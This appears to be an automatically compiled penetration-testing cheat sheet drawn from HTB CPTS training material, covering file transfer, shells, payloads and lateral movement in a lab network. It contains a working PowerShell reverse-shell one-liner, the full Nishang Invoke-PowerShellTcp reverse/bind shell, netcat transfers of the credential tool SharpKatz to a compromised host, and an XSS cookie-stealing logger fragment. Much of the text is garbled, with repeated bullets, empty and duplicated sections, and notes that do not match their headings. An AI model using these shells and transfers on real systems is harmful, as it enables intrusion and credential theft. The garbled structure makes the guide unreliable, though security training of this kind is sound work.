        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

- One of the simplest methods is the Invoke-AESEncryption.ps1 PowerShell script.
- This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.

## File Transfer with Netcat and Ncat

Aliases: —  
Tags: attack, host, netcat, port, transfer, wget  
Category: File Transfer / Miscellaneous File Transfer Methods  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
- NetCat - Compromised Machine - Listening on Port 8000 If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
- That way, we'll know when the file transfer was completed.

### Prerequisites

- The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
- NetCat - Compromised Machine - Listening on Port 8000 If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
- However, with --send-only, there is no need to anticipate further incoming information.

### Enumeration / Detection

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```shell-session
[!bash!]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
[!bash!]$ # Example using Ncat
[!bash!]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

```shell-session
[!bash!]$ # Example using Original Netcat
[!bash!]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

### Remember this attack when

- --- There are many situations when transferring files to or from a target system is necessary.
- Let's imagine the following scenario: Setting the Stage During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability.
- We perform our local enumeration manually and find that we have SeImpersonatePrivilege.

### Prerequisites

- We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges.
- We attempt to use PowerShell to transfer PowerUp.ps1 (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the Application Control Policy.
- We perform our local enumeration manually and find that we have SeImpersonatePrivilege.

### Remember this attack when

- Anonymous authentication is enabled by default if we don't set a user and password.
- Transferring Files from an FTP Server Using PowerShell When we get a shell on a remote machine, we may not have an interactive shell.
- If that's the case, we can create an FTP command file to download a file.

### Prerequisites

- Anonymous authentication is enabled by default if we don't set a user and password.
- First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

<a id="technique-nginx-enabling-put"></a>
## Nginx - Enabling PUT

Aliases: —  
Tags: curl, http, port, service, sudo, upload  
Category: File Transfer / Catching Files over HTTP/S  
OS: Cross-platform, Linux  
Service: HTTP  
Ports: 80

### Remember this attack when

- When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them.
- If using Pwnbox, we will see port 80 is already in use.
- By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files.

### Prerequisites

- In the below example, we will upload the /etc/passwd file to the server and call it users.txt Upload File Using cURL Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory.
- Thanks to Nginx being minimal, features like that are not enabled by default.

### Enumeration / Detection

```shell-session

[!bash!]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

```shell-session
[!bash!]$ sudo systemctl restart nginx.service
```

```shell-session
[!bash!]$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```shell-session
[!bash!]$ ss -lnpt | grep 80
```

Aliases: —

### Remember this attack when

- IIS could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well.
- With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window.
- Determine an Exploit Path Now, we can see from the check results that our target is likely vulnerable to EternalBlue.

### Prerequisites

- IIS could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well.
- Any options that have Required set to yes will be a necessary space to fill.
- In this instance, we need to ensure that our RHOSTS, LHOST, and LPORT fields are correctly set.

### Enumeration / Detection

### Remember this attack when

- Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.
- Here we discover a network configuration management tool called rConfig.
- This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network.

### Prerequisites

- Enumerate the Host Keeping our goal of gaining a shell session in mind, we must establish some next steps after examining our scan output.
- A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure.

## Hands-on With A Simple Reverse Shell in Windows

Aliases: —  
Tags: attack, evasion, https, netcat, port, powershell, rdp, shell, sudo, transfer, upload  
Category: Shells / Reverse Shells  
OS: Cross-platform, Linux, Windows  
Service: HTTPS, RDP  
Ports: 443, 3389

### Remember this attack when

- We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level.
- We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start.
- On the Windows target, open a command prompt and copy & paste this command: Client (target) Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target.

### Prerequisites

- Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already.
- We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start.
- That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.

### Enumeration / Detection

```shell-session
[!bash!]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

### Exploitation

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### What success looks like

- That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port.
- Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already.

Aliases: —  
Tags: discover, powershell, shell  
Category: Shells / Anatomy of a Shell  
OS: Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When we typed out our random text and hit enter, our command language interpreter was identified.
- Another way we can identify the language interpreter is by viewing the processes running on the machine.
- In Linux, we can do this using the following command: Shell Validation From 'ps' We can also find out what shell language is in use by viewing the environment variables using the env command: Shell Validation Using 'env' Now let's select the blue square icon at the top of the screen in Pwnbox.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
[!bash!]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

```shell-session
[!bash!]$ env

SHELL=/bin/bash
```

### Exploitation

```shell-session
[!bash!]$ env

SHELL=/bin/bash
```

### What success looks like

- Let's use our Parrot OS Pwnbox to further explore the anatomy of a shell.
- This $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the shell prompt where the user can begin typing commands and other input.
- So here, we can see command language interpreters can have their own set of commands that they recognize.

<a id="technique-one-liners-examined"></a>
## One-Liners Examined

Aliases: —  
Tags: attack, host, netcat, port, shell  
Category: Shells / Introduction to Payloads  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Let's break down each portion of the one-liner: Remove /tmp/f Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files.
- The output will be redirected () to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed ----

### Prerequisites

- We used this earlier in the Bind Shells section.
- Output Redirection Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).

- 2&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

### What success looks like

- The shells & payloads we choose to use largely depend on which OS we are attacking.
- We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell.
- Let's breakdown the one-liner we used: Powershell One-liner We will dissect the rather large PowerShell command you can see above.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Introduction to Payloads` → re-enumerate with the gained access.

### Common problems / Why it fails

- This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command.
- Invoke-Expression Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings.

### Variants


### What success looks like

- We could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.
- Let's start working hands-on with Metasploit by launching the Metasploit framework console as root (sudo msfconsole) Starting MSF We can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.
- NMAP Scan In the output, we see several standard ports that are typically open on a Windows system by default.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Automating Payloads & Delivery with Metasploit` → re-enumerate with the gained access.

### Common problems / Why it fails

- In the msfconsole, we can issue the command search smb to get a list of modules associated with SMB vulnerabilities: Searching Within Metasploit We will see a long list of Matching Modules associated with our search.
- Exploits Away After we issue the exploit command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload.
- " Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system.

<a id="technique-prominent-windows-exploits"></a>
## Prominent Windows Exploits

Aliases: —  
Tags: attack, dns, domain, dump, exploit, host, password, rdp, shell, smb  
Category: Shells / Infiltrating Windows  
OS: Windows  
Service: DNS, RDP, SMB  
Ports: 53, 139, 445, 3389

### Remember this attack when

- Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time.
- Let's discuss those for a minute: |Vulnerability|Description| |---|---| | MS08-067 | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw.
- It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across.

### Prerequisites

- With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host.
- It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.
- | | SeriousSam | CVE 2021-36934 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.| | PrintNightmare | A remote code execution vulnerability in the Windows Print Spooler.
- With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host.

Aliases: —  
Tags: payload, shell, sudo  
Category: Shells / Infiltrating Unix/Linux  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands.
- These shells have limited functionality and can often prevent our use of essential commands like su (switch user) and sudo (super user do), which we will likely need if we seek to escalate privileges.
- We can manually spawn a TTY shell using Python if it is present on the system.

### Prerequisites

- These shells have limited functionality and can often prevent our use of essential commands like su (switch user) and sudo (super user do), which we will likely need if we seek to escalate privileges.
- Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.
- We now have a prompt (sh-4.2$) and access to more system commands to move about the system as we please.

### Enumeration / Detection

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

### Exploitation

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

### What success looks like

- When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands.
- This is a shell typically referred to as a non-tty shell.
- These shells have limited functionality and can often prevent our use of essential commands like su (switch user) and sudo (super user do), which we will likely need if we seek to escalate privileges.

Aliases: —

### Remember this attack when

- We can start another instance of Metasploit using Proxychains by typing proxychains msfconsole to be able to pivot through the compromised dmz01 host if we don't have routing set up via a Meterpreter session.
- If we came across a Tomcat Manager login page exposed to the internet, we'd probably want to record it as a finding since an attacker could potentially brute-force it and use it to obtain a foothold.

<a id="technique-alternate-method-reverse-port-forwarding"></a>
## Alternate Method - Reverse Port Forwarding

Aliases: —  
Tags: attack, dump, host, https, meterpreter, payload, pivot, port, rdp, shell, smb, ssh, winrm  
Category: Post Exploitation / Lateral Movement / Exploitation & Privilege Escalation  
OS: Cross-platform, Linux, Windows  
Service: HTTPS, RDP, SMB, SSH, winrm  
Ports: 22, 139, 443, 445, 3389, 5985, 5986

### Remember this attack when

- Next, execute the teams.exe payload from the DEV01 host, and if all goes to plan, we'll get a connection back.
- A caveat to the above method is that, by default, OpenSSH only allows connection to remote forwarded ports from the server itself (localhost).
- To allow this, we must edit the /etc/ssh/sshdconfig file on Ubuntu systems and change the line GatewayPorts no to GatewayPorts yes, otherwise we will not be able to get a call back on the port we forwarded in the SSH command (port 443 in our case).

### Prerequisites

- We could have also performed all of these actions without ever getting a shell, as we could have used PrintSpoofer to add a local admin or dump credentials from DEV01 and then connect to the host in any number of ways from our attack host using Proxychains (pass-the-hash, RDP, WinRM, etc.).
- First off, we need to generate a payload using msfvenom.
- Next, we need to set up a multi/handler and start a listener on a different port than the payload we generated will use.

### Enumeration / Detection


## dev.inlanefreight.local

Aliases: —  
Tags: attack, bypass, curl, host, http, password, shell, upload  
Category: Post Exploitation / Lateral Movement / Web Enumeration & Exploitation

### Remember this attack when

- This looks like a homegrown password manager or similar and could lead to considerable data exposure if we can get in.
- The files with a 403 forbidden error code typically mean that the files exist, but the webserver doesn't allow us to browse to them anonymously.
- If we're able to upload a PHP web shell, chances are we can browse right to it in the /uploads directory, which has directory listing enabled.

### Prerequisites

- If we're able to upload a PHP web shell, chances are we can browse right to it in the /uploads directory, which has directory listing enabled.
- We can note this down as a valid low-risk finding, Directory Listing Enabled, and capture the necessary evidence to make report writing quick and painless.
- We'll need Burp Suite here to capture the request and see if we can figure out what's going on.

### What success looks like

- If we're able to upload a PHP web shell, chances are we can browse right to it in the /uploads directory, which has directory listing enabled.
- Browsing to /upload.php gives us a 403 Forbidden error message and nothing more, which is interesting because the status code is a 200 OK success code.
- We can click on the Browse button and attempt to upload a simple webshell with the following contents: Save the file as 5351bf7271abaa2267e03c9ef6393f13.php or something similar.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Web Enumeration & Exploitation` → re-enumerate with the gained access.

### Common problems / Why it fails

- The files with a 403 forbidden error code typically mean that the files exist, but the webserver doesn't allow us to browse to them anonymously.
- Browsing to /upload.php gives us a 403 Forbidden error message and nothing more, which is interesting because the status code is a 200 OK success code.
- Cycling through the various options, each gives us a server error until we try the TRACK method and see that the X-Custom-IP-Authorization: header is set in the HTTP response.

## Email Services

Aliases: —  
Tags: attack, dns, ftp, host, nmap, password, pop3, port, scan, service, smtp, ssh, sudo

### Remember this attack when

- Let's do another scan against port 25 to look for misconfigurations.
- Next, we'll check for any misconfigurations related to authentication.
- Though this is relatively low-risk, it's worth noting down as a Low finding for our report as our clients should reduce their external attack surface as much as possible.

### Prerequisites

- If this is no valid business reason for this command to be enabled, then we should advise them to disable it.
- If they are using Office 365 or on-prem Exchange, we may be able to mount a password spraying attack that could yield access to email inboxes or potentially the internal network if we can use a valid email password to connect over VPN.
- We may also come across an Open Relay, which we could possibly abuse for Phishing by sending emails as made-up users or spoofing an email account to make an email look official and attempt to trick employees into entering credentials or executing a payload.

<a id="technique-enumerating-172-16-8-20-dotnetnuke-dnn"></a>
## Enumerating 172.16.8.20 - DotNetNuke (DNN)

Aliases: —  
Tags: attack, curl, host, http, nfs, nmap, password, port, scan, ssh, transfer  
Category: Post Exploitation / Lateral Movement / Internal Information Gathering  
OS: Cross-platform, Linux, Windows  
Service: HTTP, NFS, SSH  
Ports: 22, 80, 111, 2049

### Remember this attack when

- You will be notified by email when your registration has been approved.
- If the NFS server is misconfigured (which they often are internally), we can browse NFS shares and potentially uncover some sensitive data.
- We find one export, DEV01, that is accessible to everyone (anonymous access).

### Prerequisites

- We can't mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try.
- From our discussions on pillaging throughout the Penetration Tester Path, we know that config files can often contain credentials, making them a key target during any assessment.
- It can never hurt to "listen on the wire" whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us.

### Enumeration / Detection

```shell-session
[!bash!]$ proxychains showmount -e 172.16.8.20
```

<a id="technique-hunting-for-sensitive-data-hosts"></a>
## Hunting for Sensitive Data/Hosts

Aliases: —  
Tags: dns, domain, host, powershell, ssh, winrm  
Category: Post Exploitation / Lateral Movement / Post-Exploitation  
OS: Linux, Windows  
Service: DNS, SSH, winrm  
Ports: 22, 53, 5985, 5986

### Remember this attack when

- If we want to demonstrate impact for our clients a good spot to start is going back to the file shares to see what other types of data we can now view.
- As discussed in the Documentation & Reporting module, we should make sure to just take screenshots showing a file listing if we find a particularly sensitive file share, and not open individual files and take screenshots or remove any files from the network.
- Let's go back to the Department Shares share and see what else we can find.

### Prerequisites

- Once we've gained access to the Domain Controller we can likely access most any resources in the domain.
- It can be a good practice to not allow Domain Admins to have blanket access to all data, because if one account is compromised then everything will be.
- In our case Inlanefreight has asked us to test if we can gain access to any hosts in the 172.16.9.0/23 subnet.

Aliases: —

<a id="technique-monitoring-inlanefreight-local"></a>
## monitoring.inlanefreight.local

Aliases: —  
Tags: attack, brute, bypass, credential, fuzz, host, http, hydra, password, service, shell, sql, ssh, vhost  
Category: Post Exploitation / Lateral Movement / Web Enumeration & Exploitation  
OS: Cross-platform, Linux, Windows  
Service: HTTP, SSH  
Ports: 22, 80

### Remember this attack when

- We discovered the monitoring vhost earlier, so we won't repeat the process.
- Since this is a login form, it is worth exploring further so we can fuzz it a bit with Burp Intruder to see if we can provoke an error message indicative of a SQL injection vulnerability, but we are not successful.
- If we type help, we are presented with a list of commands.

### Prerequisites

- We can try some authentication bypass payloads and common weak credential pairs but don't get anywhere, just receiving the Invalid Credentials!
- We'll set up hydra to perform the brute-forcing attack, specifying the Invalid Credentials!
- We get a hit for the credential pair admin:12qwaszx, a common "keyboard walk" password that is easy to remember but can be very easily brute-forced/cracked.

### What success looks like

- Since this is a login form, it is worth exploring further so we can fuzz it a bit with Burp Intruder to see if we can provoke an error message indicative of a SQL injection vulnerability, but we are not successful.
- We get a hit for the credential pair admin:12qwaszx, a common "keyboard walk" password that is easy to remember but can be very easily brute-forced/cracked.
- Once logged in, we are presented with some sort of monitoring console.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Web Enumeration & Exploitation` → re-enumerate with the gained access.

### Common problems / Why it fails

- Since this is a login form, it is worth exploring further so we can fuzz it a bit with Burp Intruder to see if we can provoke an error message indicative of a SQL injection vulnerability, but we are not successful.
- error message to filter out invalid login attempts.
- We are unable to cd to other directories.

### Remember this attack when

### Remember this attack when

- Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.
- Looking through the Windows Privilege Escalation module, we don't find much interesting so let's hunt for credentials.
- After some digging around, we find an unattend.xml file leftover from a previous installation.

### Prerequisites

- At this point, we have dug into the domain pretty heavily and have found several sets of credentials but hit a bit of a brick wall.
- Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.
- The host 172.16.8.50, or MS01 is the only one left that we haven't gotten into aside from the Domain Controller, so let's give it a try using evil-winrm and the credentials for the backupadm user.

### Remember this attack when

- It's also good to have a backup way to get back in when using someone's credentials, as they may notice that their account is compromised or just hit that time of the month when they are prompted to change their password, and we won't be able to connect back in the next day.

### Remember this attack when

- Typical authentication bypasses don't get us anywhere, so we go back to the basics per the Attacking Common Applications module Application Discovery & Enumeration section and try some weak credential pairs.
- When we see dev in a URL (especially external-facing), we can assume it is not production-ready and worth digging into, especially because of the comment Checkout Process not Implemented near the bottom of the page.
- We can test the search for injection vulnerabilities and search around for IDORs and other flaws but don't find anything particularly interesting.

## support.inlanefreight.local

Aliases: —  
Tags: attack, hijack, host, http, netcat, port, sudo, ticket, xss  
Category: Post Exploitation / Lateral Movement / Web Enumeration & Exploitation  
OS: Cross-platform, Linux  
Service: HTTP  
Ports: 80

### Remember this attack when

- Support ticketing portals may allow us to engage with a live user and can sometimes lead to a client-side attack where we can hijack a user's session via a Cross-Site Scripting (XSS) vulnerability.
- Browsing around the application, we find the /ticket.php page where we can raise a support ticket.
- Let's see if we can trigger some type of user interaction.

### Prerequisites

- Now we need to figure out how we can steal an admin's cookie so we can log in and see what type of access we can get.

### Enumeration / Detection

### Exploitation

```php
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## The Double Pivot - MGMT01

Aliases: —  
Tags: attack, exploit, host, metasploit, meterpreter, payload, pivot, shell, ssh, winrm  
Category: Post Exploitation / Lateral Movement / Post-Exploitation  
OS: Cross-platform, Linux, Windows  
Service: SSH, winrm  
Ports: 22, 5985, 5986

### Remember this attack when

- Start by creating the ELF payload and uploading it back to the dmz01 host via SCP if you removed it.
- Execute the payload on the DC and, if all goes to plan, we'll catch it in our handler.
- If you already have a line in there from earlier, comment it out or replace the port number.

### Prerequisites

- Attack host -- dmz01 -- DC01 -- MGMT01 We'll need to establish a reverse shell from the dmz01 box back to our attack host.
- Now we need to set up a socks proxy which is the final step before we can communicate directly with the 172.16.9.0/23 network from our attack host.
- As a final step we'll enumerate the target system, checking for local privilege escalation opportunities.
